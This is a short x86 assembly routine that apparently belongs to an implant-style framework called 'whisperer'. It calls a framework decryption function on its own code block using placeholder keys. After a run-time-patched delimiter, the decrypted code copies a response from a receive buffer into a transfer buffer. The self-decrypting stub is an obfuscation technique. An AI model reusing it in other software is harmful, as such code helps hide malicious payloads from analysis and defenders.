use32
org 0



CopyBlockCall:
        push ebp
        mov ebp, esp

        mov ebx, 0xaaaaaaaa ;key0
        mov edx, 0xbbbbbbbb ;key1
        mov ecx, .call_end - .call_begin

        mov eax, [ebp + 8] ; eax = whisperer context
        mov eax, [eax] ; eax = whisperer framework
        mov eax, [eax + 16] ; eax = decryption function

        call eax

.call_begin:
dq 0x2222222222222222 ; delimiter, gets filled with nops at run time

        mov ebx, [ebp + 8] ; ebx = context
        mov esi, dword [ebx + 36] ; esi = receive buffer
        mov edi, dword [ebx + 852] ; edi = transfer buffer
        mov ecx, dword [ebx + 844] ; ecx = response length

        rep movsb ; perform copy from local buffer -> transfer buffer



        pop ebp
        ret 4



.call_end: